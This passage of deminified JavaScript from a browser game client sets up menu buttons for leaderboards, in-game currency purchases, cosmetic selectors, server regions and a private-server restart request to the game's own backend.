                    this.buttons[e] = be(66, 73, 0, [IMAGES.TUTO_PREVIOUS_OUT, IMAGES.TUTO_PREVIOUS_IN, IMAGES.TUTO_PREVIOUS_CLICK], 1, 0, void 0, -68, 340, a | o, P),
                    this.buttons[e++].view = c,
                    this.buttons[e] = be(66, 73, 0, [IMAGES.TUTO_NEXT_OUT, IMAGES.TUTO_NEXT_IN, IMAGES.TUTO_NEXT_CLICK], 1, 0, void 0, -30, 340, a | o, P),
                    this.buttons[e++].view = c,
                    this.buttons[e] = be(97, 66, 0, [IMAGES.LVL_LEADERBOARD_OUT, IMAGES.LVL_LEADERBOARD_IN, IMAGES.LVL_LEADERBOARD_CLICK], 1, 0, void 0, -14, 151, a | o, P),
                    this.buttons[e++].view = O,
                    this.LEADERBOARD_KILL = e,
                    this.buttons[e] = be(135, 66, 0, [IMAGES.KILL_LEADERBOARD_OUT, IMAGES.KILL_LEADERBOARD_IN, IMAGES.KILL_LEADERBOARD_CLICK], 1, 0, function () {
                        _o(void 0, void 0, Se.LEADERBOARD_KILL)
                    }, 37.5, 151, a | o, P),
                    this.buttons[e++].view = O,
                    this.LEADERBOARD_TIME = e,
                    this.buttons[e] = be(160, 66, 0, [IMAGES.TIME_LEADERBOARD_OUT, IMAGES.TIME_LEADERBOARD_IN, IMAGES.TIME_LEADERBOARD_CLICK], 1, 0, function () {
                        _o(void 0, void 0, Se.LEADERBOARD_TIME)
                    }, 107.5, 151, a | o, P),
                    this.buttons[e++].view = O,
                    this.LEADERBOARD_SCORE = e,
                    this.buttons[e] = be(207, 66, 0, [IMAGES.SCORE_LEADERBOARD_OUT, IMAGES.SCORE_LEADERBOARD_IN, IMAGES.SCORE_LEADERBOARD_CLICK], 1, 0, function () {
                        _o(void 0, void 0, Se.LEADERBOARD_SCORE)
                    }, 190.5, 151, a | o, P),
                    this.buttons[e++].view = O,
                    this.LEADERBOARD_TODAY = e,
                    this.buttons[e] = be(144, 66, 0, [IMAGES.TODAY_LEADERBOARD_OUT, IMAGES.TODAY_LEADERBOARD_IN, IMAGES.TODAY_LEADERBOARD_CLICK], 1, 0, function () {
                        _o(Se.LEADERBOARD_TODAY)
                    }, 103.5, 110, a | o, P),
                    this.buttons[e++].view = O,
                    this.LEADERBOARD_WEEK = e,
                    this.buttons[e] = be(124, 66, 0, [IMAGES.WEEK_LEADERBOARD_OUT, IMAGES.WEEK_LEADERBOARD_IN, IMAGES.WEEK_LEADERBOARD_CLICK], 1, 0, function () {
                        _o(Se.LEADERBOARD_WEEK)
                    }, 177.5, 110, a | o, P),
                    this.buttons[e++].view = O,
                    this.LEADERBOARD_ALL = e,
                    this.buttons[e] = be(104, 66, 0, [IMAGES.ALL_LEADERBOARD_OUT, IMAGES.ALL_LEADERBOARD_IN, IMAGES.ALL_LEADERBOARD_CLICK], 1, 0, function () {
                        _o(Se.LEADERBOARD_ALL)
                    }, 242, 110, a | o, P),
                    this.buttons[e++].view = O,
                    this.LEADERBOARD_SEASON1 = e,
                    this.buttons[e] = be(183, 66, 0, [IMAGES.SEASON1_LEADERBOARD_OUT, IMAGES.SEASON1_LEADERBOARD_IN, IMAGES.SEASON1_LEADERBOARD_CLICK], 1, 0, function () {
                        _o(void 0, void 0, void 0, Se.LEADERBOARD_SEASON1)
                    }, -290, 521, a | o, P),
                    this.buttons[e++].view = O,
                    this.LEADERBOARD_SEASON2 = e,
                    this.buttons[e] = be(183, 66, 0, [IMAGES.SEASON2_LEADERBOARD_OUT, IMAGES.SEASON2_LEADERBOARD_IN, IMAGES.SEASON2_LEADERBOARD_CLICK], 1, 0, function () {
                        _o(void 0, void 0, void 0, Se.LEADERBOARD_SEASON2)
                    }, -185, 521, a | o, P),
                    this.buttons[e++].view = O,
                    this.LEADERBOARD_SEASON3 = e,
                    this.buttons[e] = be(183, 66, 0, [IMAGES.SEASON3_LEADERBOARD_OUT, IMAGES.SEASON3_LEADERBOARD_IN, IMAGES.SEASON3_LEADERBOARD_CLICK], 1, 0, function () {
                        _o(void 0, void 0, void 0, Se.LEADERBOARD_SEASON3)
                    }, -80, 521, a | o, P),
                    this.buttons[e++].view = O,
                    this.LEADERBOARD_SEASON4 = e,
                    this.buttons[e] = be(183, 66, 0, [IMAGES.SEASON4_LEADERBOARD_OUT, IMAGES.SEASON4_LEADERBOARD_IN, IMAGES.SEASON4_LEADERBOARD_CLICK], 1, 0, function () {
                        _o(void 0, void 0, void 0, Se.LEADERBOARD_SEASON4)
                    }, 25, 521, a | o, P),
                    this.buttons[e++].view = O,
                    this.LEADERBOARD_SEASON5 = e,
                    this.buttons[e] = be(183, 66, 0, [IMAGES.SEASON5_LEADERBOARD_OUT, IMAGES.SEASON5_LEADERBOARD_IN, IMAGES.SEASON5_LEADERBOARD_CLICK], 1, 0, function () {
                        _o(void 0, void 0, void 0, Se.LEADERBOARD_SEASON5)
                    }, 130, 521, a | o, P),
                    this.buttons[e++].view = O,
                    this.buttons[e] = be(232, 352, 0, [IMAGES.CURRENCY1_OUT, IMAGES.CURRENCY1_IN, IMAGES.CURRENCY1_CLICK], 1, 0, function () {
                        io(300)
                    }, -330, 135, a | o, P),
                    this.buttons[e++].view = t,
                    this.buttons[e] = be(232, 352, 0, [IMAGES.CURRENCY2_OUT, IMAGES.CURRENCY2_IN, IMAGES.CURRENCY2_CLICK], 1, 0, function () {
                        io(600)
                    }, -195, 135, a | o, P),
                    this.buttons[e++].view = t,
                    this.buttons[e] = be(243, 374, 0, [IMAGES.CURRENCY3_OUT, IMAGES.CURRENCY3_IN, IMAGES.CURRENCY3_CLICK], 1, 0, function () {
                        io(2600)
                    }, -60, 130, a | o, P),
                    this.buttons[e++].view = t,
                    this.buttons[e] = be(232, 352, 0, [IMAGES.CURRENCY4_OUT, IMAGES.CURRENCY4_IN, IMAGES.CURRENCY4_CLICK], 1, 0, function () {
                        io(7e3)
                    }, 78, 135, a | o, P),
                    this.buttons[e++].view = t,
                    this.buttons[e] = be(243, 374, 0, [IMAGES.CURRENCY5_OUT, IMAGES.CURRENCY5_IN, IMAGES.CURRENCY5_CLICK], 1, 0, function () {
                        io(2e4)
                    }, 213, 130, a | o, P),
                    this.buttons[e++].view = t,
                    this.buttons[e] = be(58, 64, 0, [IMAGES.CLOSE_BUTTON_OUT, IMAGES.CLOSE_BUTTON_IN, IMAGES.CLOSE_BUTTON_CLICK], 1, 0, function () {
                        v(I)
                    }, 300, 88, a | o, P),
                    this.buttons[e++].view = t,
                    this.buttons[e] = be(323, 112, 0, [IMAGES.SKIN_BUTTON_OUT, IMAGES.SKIN_BUTTON_IN, IMAGES.SKIN_BUTTON_CLICK], 1, 0, function () {
                        v(g),
                            Ie.initSelector()
                    }, -315, 185, a | o, P),
                    this.buttons[e++].view = l,
                    this.buttons[e] = be(323, 112, 0, [IMAGES.ACCESSORY_BUTTON_OUT, IMAGES.ACCESSORY_BUTTON_IN, IMAGES.ACCESSORY_BUTTON_CLICK], 1, 0, function () {
                        v(b),
                            Re.initSelector()
                    }, -315, 321, a | o, P),
                    this.buttons[e++].view = l,
                    this.buttons[e] = be(323, 112, 0, [IMAGES.BAG_BUTTON_OUT, IMAGES.BAG_BUTTON_IN, IMAGES.BAG_BUTTON_CLICK], 1, 0, function () {
                        v(R),
                            ce.initSelector()
                    }, 153, 185, a | o, P),
                    this.buttons[e++].view = l,
                    this.buttons[e] = be(323, 112, 0, [IMAGES.BOOK_BUTTON_OUT, IMAGES.BOOK_BUTTON_IN, IMAGES.BOOK_BUTTON_CLICK], 1, 0, function () {
                        v(C),
                            Oe.initSelector()
                    }, 153, 321, a | o, P),
                    this.buttons[e++].view = l,
                    this.buttons[e] = be(323, 112, 0, [IMAGES.CRATE_BUTTON_OUT, IMAGES.CRATE_BUTTON_IN, IMAGES.CRATE_BUTTON_CLICK], 1, 0, function () {
                        v(p),
                            ge.initSelector()
                    }, 153, 463, a | o, P),
                    this.buttons[e++].view = l,
                    this.buttons[e] = be(323, 112, 0, [IMAGES.LOOT_BUTTON_OUT, IMAGES.LOOT_BUTTON_IN, IMAGES.LOOT_BUTTON_CLICK], 1, 0, function () {
                        v(N),
                            pe.initSelector()
                    }, -315, 463, a | o, P),
                    this.buttons[e++].view = l,
                    this.buttons[e] = be(327, 117, 0, [IMAGES.SEASON_5, IMAGES.SEASON_5_IN, IMAGES.SEASON_5_OUT], 1, 0, function () {
                        v(te)
                    }, 155, 70, i, z),
                    this.buttons[e++].view = d,
                    this.buttons[e] = be(130, 129, 0, [IMAGES.SHOP_BUTTON_OUT, IMAGES.SHOP_BUTTON_IN, IMAGES.SHOP_BUTTON_CLICK], 1, 0, function () {
                        D(Y, P, "none"),
                            v(I)
                    }, 10, 40, a | o, P),
                    this.buttons[e++].view = Y,
                    this.buttons[e] = be(130, 129, 0, [IMAGES.SHOP_BUTTON_OUT, IMAGES.SHOP_BUTTON_IN, IMAGES.SHOP_BUTTON_CLICK], 1, 0, function () {
                        D(F, P, "none"),
                            v(I)
                    }, 10, 40, a | o, P),
                    this.buttons[e++].view = F,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(I)
                    }, 200, 140, a | o, P),
                    this.buttons[e++].view = S,
                    this.buttons[e] = be(253, 110, 0, [IMAGES.ATLANTA_OUT, IMAGES.ATLANTA_IN, IMAGES.ATLANTA_CLICK], 1, 0, function () {
                        no("Atlanta")
                    }, -265, 300, a | o, P),
                    this.buttons[e++].view = S,
                    this.buttons[e] = be(253, 110, 0, [IMAGES.DALLAS_OUT, IMAGES.DALLAS_IN, IMAGES.DALLAS_CLICK], 1, 0, function () {
                        no("Dallas")
                    }, -130, 300, a | o, P),
                    this.buttons[e++].view = S,
                    this.buttons[e] = be(253, 110, 0, [IMAGES.FREMONT_OUT, IMAGES.FREMONT_IN, IMAGES.FREMONT_CLICK], 1, 0, function () {
                        no("Fremont")
                    }, 5, 300, a | o, P),
                    this.buttons[e++].view = S,
                    this.buttons[e] = be(253, 110, 0, [IMAGES.NEWARK_OUT, IMAGES.NEWARK_IN, IMAGES.NEWARK_CLICK], 1, 0, function () {
                        no("Newark")
                    }, 140, 300, a | o, P),
                    this.buttons[e++].view = S,
                    this.buttons[e] = be(253, 110, 0, [IMAGES.LONDON_OUT, IMAGES.LONDON_IN, IMAGES.LONDON_CLICK], 1, 0, function () {
                        no("London")
                    }, -265, 365, a | o, P),
                    this.buttons[e++].view = S,
                    this.buttons[e] = be(253, 110, 0, [IMAGES.FRANKFURT_OUT, IMAGES.FRANKFURT_IN, IMAGES.FRANKFURT_CLICK], 1, 0, function () {
                        no("Frankfurt")
                    }, -130, 365, a | o, P),
                    this.buttons[e++].view = S,
                    this.buttons[e] = be(253, 110, 0, [IMAGES.SINGAPORE_OUT, IMAGES.SINGAPORE_IN, IMAGES.SINGAPORE_CLICK], 1, 0, function () {
                        no("Singapore")
                    }, 5, 365, a | o, P),
                    this.buttons[e++].view = S,
                    this.buttons[e] = be(253, 110, 0, [IMAGES.TOKYO_OUT, IMAGES.TOKYO_IN, IMAGES.TOKYO_CLICK], 1, 0, function () {
                        no("Tokyo")
                    }, 140, 365, a | o, P),
                    this.buttons[e++].view = S,
                    this.buttons[e] = be(253, 110, 0, [IMAGES.TORONTO_OUT, IMAGES.TORONTO_IN, IMAGES.TORONTO_CLICK], 1, 0, function () {
                        no("Toronto")
                    }, -265, 430, a | o, P),
                    this.buttons[e++].view = S,
                    this.buttons[e] = be(253, 110, 0, [IMAGES.MUMBAI_OUT, IMAGES.MUMBAI_IN, IMAGES.MUMBAI_CLICK], 1, 0, function () {
                        no("Mumbai")
                    }, -130, 430, a | o, P),
                    this.buttons[e++].view = S,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(S)
                    }, 230, 140, a | o, P),
                    this.buttons[e++].view = ee,
                    this.buttons[e] = be(230, 352, 0, [IMAGES.DAYS3_OUT, IMAGES.DAYS3_IN, IMAGES.DAYS3_CLICK], 1, 0, function () {
                        io(350)
                    }, -280, 240, a | o, P),
                    this.buttons[e++].view = ee,
                    this.buttons[e] = be(230, 352, 0, [IMAGES.DAYS7_OUT, IMAGES.DAYS7_IN, IMAGES.DAYS7_CLICK], 1, 0, function () {
                        io(700)
                    }, -130, 240, a | o, P),
                    this.buttons[e++].view = ee,
                    this.buttons[e] = be(230, 352, 0, [IMAGES.DAYS30_OUT, IMAGES.DAYS30_IN, IMAGES.DAYS30_CLICK], 1, 0, function () {
                        io(1400)
                    }, 20, 240, a | o, P),
                    this.buttons[e++].view = ee,
                    this.buttons[e] = be(230, 352, 0, [IMAGES.DAYS90_OUT, IMAGES.DAYS90_IN, IMAGES.DAYS90_CLICK], 1, 0, function () {
                        io(3e3)
                    }, 170, 240, a | o, P),
                    this.buttons[e++].view = ee,
                    this.buttons[e] = be(105, 119, 0, [IMAGES.COPY_PASTE_OUT, IMAGES.COPY_PASTE_IN, IMAGES.COPY_PASTE_CLICK], 1, 0, function () {
                        document.getElementById("serverAddressInput").select(),
                            document.execCommand("copy")
                    }, 170, 310, a | o, P),
                    this.buttons[e++].view = m,
                    this.buttons[e] = be(105, 119, 0, [IMAGES.RESTART_OUT, IMAGES.RESTART_IN, IMAGES.RESTART_CLICK], 1, 0, function () {
                        var e;
                        (e = new XMLHttpRequest).open("GET", W2 + "rebootServer?token=" + U2 + "&userid=" + Y2),
                            e.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
                            e.onreadystatechange = function () {
                                4 === this.readyState && 200 === this.status && "0" !== e.responseText && (location.href = document.getElementById("serverAddressInput").value)
                            }
                            ,
                            e.send()
                    }, 235, 310, a | o, P),
                    this.buttons[e++].view = m,
                    this.buttons[e] = be(204, 115, 0, [IMAGES.GUIDE_OUT, IMAGES.GUIDE_IN, IMAGES.GUIDE_CLICK], 1, 0, function () {
                        window.open("./commands.html", "_blank")
                    }, -265, 490, a | o, P),
                    this.buttons[e++].view = m,
                    this.buttons[e] = be(145, 69, 0, [IMAGES.PRICE5_OUT, IMAGES.PRICE5_IN, IMAGES.PRICE5_CLICK], 1, 0, function () {
                        v(x)
                    }, -210, 170, a | o, P),
                    this.buttons[e++].view = I,
                    this.buttons[e] = be(145, 69, 0, [IMAGES.PRICE1_OUT, IMAGES.PRICE1_IN, IMAGES.PRICE1_CLICK], 1, 0, function () {
                        v(j)
                    }, 70, 170, a | o, P),
                    this.buttons[e++].view = I,
                    this.buttons[e] = be(145, 69, 0, [IMAGES.PRICE2_OUT, IMAGES.PRICE2_IN, IMAGES.PRICE2_CLICK], 1, 0, function () {
                        v(J)
                    }, 70, 204, a | o, P),
                    this.buttons[e++].view = I,
                    this.buttons[e] = be(145, 69, 0, [IMAGES.PRICE3_OUT, IMAGES.PRICE3_IN, IMAGES.PRICE3_CLICK], 1, 0, function () {
                        v(q)
                    }, -210, 204, a | o, P),
                    this.buttons[e++].view = I,
                    this.buttons[e] = be(145, 69, 0, [IMAGES.PRICE3_OUT, IMAGES.PRICE3_IN, IMAGES.PRICE3_CLICK], 1, 0, function () {
                        v(Z)
                    }, 70, 238, a | o, P),
                    this.buttons[e++].view = I,
                    this.buttons[e] = be(145, 69, 0, [IMAGES.PRICE3_OUT, IMAGES.PRICE3_IN, IMAGES.PRICE3_CLICK], 1, 0, function () {
                        T.isUserLogged() ? ao(0, 300) : v(h)
                    }, 307, 205, a | o, P),
                    this.buttons[e++].view = I,
                    this.buttons[e] = be(145, 69, 0, [IMAGES.PRICE4_OUT, IMAGES.PRICE4_IN, IMAGES.PRICE4_CLICK], 1, 0, function () {
                        v(X)
                    }, -210, 238, a | o, P),
                    this.buttons[e++].view = I,
                    this.buttons[e] = be(145, 69, 0, [IMAGES.PRICE4_OUT, IMAGES.PRICE4_IN, IMAGES.PRICE4_CLICK], 1, 0, function () {
                        T.isUserLogged() ? ao(1, 600) : v(h)
                    }, 307, 239, a | o, P),
                    this.buttons[e++].view = I,
                    this.buttons[e] = be(192, 101, 0, [IMAGES.YES_BUTTON_OUT, IMAGES.YES_BUTTON_IN, IMAGES.YES_BUTTON_CLICK], 1, 0, function () {
                        oo()
                    }, -100, 250, a | o, P),
                    this.buttons[e++].view = $,
                    this.buttons[e] = be(192, 104, 0, [IMAGES.YES_300_BUTTON_OUT, IMAGES.YES_300_BUTTON_IN, IMAGES.YES_300_BUTTON_CLICK], 1, 0, function () {
                        oo()
                    }, -100, 239, a | o, P),
                    this.buttons[e++].view = Q,
                    this.buttons[e] = be(192, 101, 0, [IMAGES.NO_BUTTON_OUT, IMAGES.NO_BUTTON_IN, IMAGES.NO_BUTTON_CLICK], 1, 0, function () {
                        v(A)
                    }, 10, 250, a | o, P),
                    this.buttons[e++].view = $,
                    this.buttons[e] = be(192, 104, 0, [IMAGES.NO_THANKS_BUTTON_OUT, IMAGES.NO_THANKS_BUTTON_IN, IMAGES.NO_THANKS_BUTTON_CLICK], 1, 0, function () {
                        v(A)
                    }, 10, 239, a | o, P),
                    this.buttons[e++].view = Q,
                    (RARITY_BUTTON = [])[RARITY.FREE] = [IMAGES.FREE_ITEM_OUT, IMAGES.FREE_ITEM_IN, IMAGES.FREE_ITEM_CLICK],
                    RARITY_BUTTON[RARITY.WOOD] = [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK],
                    RARITY_BUTTON[RARITY.STONE] = [IMAGES.STONE_ITEM_OUT, IMAGES.STONE_ITEM_IN, IMAGES.STONE_ITEM_CLICK],
                    RARITY_BUTTON[RARITY.GOLD] = [IMAGES.GOLD_ITEM_OUT, IMAGES.GOLD_ITEM_IN, IMAGES.GOLD_ITEM_CLICK],
                    RARITY_BUTTON[RARITY.DIAMOND] = [IMAGES.DIAMOND_ITEM_OUT, IMAGES.DIAMOND_ITEM_IN, IMAGES.DIAMOND_ITEM_CLICK],
                    RARITY_BUTTON[RARITY.AMETHYST] = [IMAGES.AMETHYST_ITEM_OUT, IMAGES.AMETHYST_ITEM_IN, IMAGES.AMETHYST_ITEM_CLICK],
                    RARITY_BUTTON[RARITY.REIDITE] = [IMAGES.REIDITE_ITEM_OUT, IMAGES.REIDITE_ITEM_IN, IMAGES.REIDITE_ITEM_CLICK],
                    RARITY_BUTTON[RARITY.LEVEL] = [IMAGES.LEVEL_ITEM_OUT, IMAGES.LEVEL_ITEM_IN, IMAGES.LEVEL_ITEM_CLICK],
                    RARITY_BUTTON[RARITY.SPECIAL] = [IMAGES.SPECIAL_ITEM_OUT, IMAGES.SPECIAL_ITEM_IN, IMAGES.SPECIAL_ITEM_CLICK],
                    FIRST_BUTTON_SKIN = e,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 205, a | o, P),
                    this.buttons[e++].view = g,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 300, a | o, P),
                    this.buttons[e++].view = g,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 395, a | o, P),
                    this.buttons[e++].view = g,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 205, a | o, P),
                    this.buttons[e++].view = g,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 300, a | o, P),
                    this.buttons[e++].view = g,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 395, a | o, P),
                    this.buttons[e++].view = g,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 205, a | o, P),
                    this.buttons[e++].view = g,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 300, a | o, P),
                    this.buttons[e++].view = g,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 395, a | o, P),
                    this.buttons[e++].view = g,
                    this.buttons[e] = be(39, 122, 0, [IMAGES.SKIN_PREVIOUS_OUT, IMAGES.SKIN_PREVIOUS_IN, IMAGES.SKIN_PREVIOUS_CLICK], 1, 0, void 0, -61, 315, a | o, P),
                    this.buttons[e++].view = g,
                    this.buttons[e] = be(39, 122, 0, [IMAGES.SKIN_NEXT_OUT, IMAGES.SKIN_NEXT_IN, IMAGES.SKIN_NEXT_CLICK], 1, 0, void 0, 260, 315, a | o, P),
                    this.buttons[e++].view = g,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(l)
                    }, -320, 470, a | o, P),
                    this.buttons[e++].view = g,
                    FIRST_BUTTON_ACCESSORY = e,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 205, a | o, P),
                    this.buttons[e++].view = b,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 300, a | o, P),
                    this.buttons[e++].view = b,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 395, a | o, P),
                    this.buttons[e++].view = b,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 205, a | o, P),
                    this.buttons[e++].view = b,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 300, a | o, P),
                    this.buttons[e++].view = b,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 395, a | o, P),
                    this.buttons[e++].view = b,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 205, a | o, P),
                    this.buttons[e++].view = b,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 300, a | o, P),
                    this.buttons[e++].view = b,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 395, a | o, P),
                    this.buttons[e++].view = b,
                    this.buttons[e] = be(39, 122, 0, [IMAGES.SKIN_PREVIOUS_OUT, IMAGES.SKIN_PREVIOUS_IN, IMAGES.SKIN_PREVIOUS_CLICK], 1, 0, void 0, -61, 315, a | o, P),
                    this.buttons[e++].view = b,
                    this.buttons[e] = be(39, 122, 0, [IMAGES.SKIN_NEXT_OUT, IMAGES.SKIN_NEXT_IN, IMAGES.SKIN_NEXT_CLICK], 1, 0, void 0, 260, 315, a | o, P),
                    this.buttons[e++].view = b,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(l)
                    }, -320, 470, a | o, P),
                    this.buttons[e++].view = b,
                    FIRST_BUTTON_LOOT = e,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 205, a | o, P),
                    this.buttons[e++].view = N,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 300, a | o, P),
                    this.buttons[e++].view = N,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 395, a | o, P),
                    this.buttons[e++].view = N,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 205, a | o, P),
                    this.buttons[e++].view = N,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 300, a | o, P),
                    this.buttons[e++].view = N,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 395, a | o, P),
                    this.buttons[e++].view = N,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 205, a | o, P),
                    this.buttons[e++].view = N,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 300, a | o, P),
                    this.buttons[e++].view = N,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 395, a | o, P),
                    this.buttons[e++].view = N,
                    this.buttons[e] = be(39, 122, 0, [IMAGES.SKIN_PREVIOUS_OUT, IMAGES.SKIN_PREVIOUS_IN, IMAGES.SKIN_PREVIOUS_CLICK], 1, 0, void 0, -61, 315, a | o, P),
                    this.buttons[e++].view = N,
                    this.buttons[e] = be(39, 122, 0, [IMAGES.SKIN_NEXT_OUT, IMAGES.SKIN_NEXT_IN, IMAGES.SKIN_NEXT_CLICK], 1, 0, void 0, 260, 315, a | o, P),
                    this.buttons[e++].view = N,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(l)
                    }, -320, 470, a | o, P),
                    this.buttons[e++].view = N,
                    FIRST_BUTTON_BAG = e,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 205, a | o, P),
                    this.buttons[e++].view = R,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 300, a | o, P),
                    this.buttons[e++].view = R,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 395, a | o, P),
                    this.buttons[e++].view = R,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 205, a | o, P),
                    this.buttons[e++].view = R,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 300, a | o, P),
                    this.buttons[e++].view = R,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 395, a | o, P),
                    this.buttons[e++].view = R,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 205, a | o, P),
                    this.buttons[e++].view = R,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 300, a | o, P),
                    this.buttons[e++].view = R,
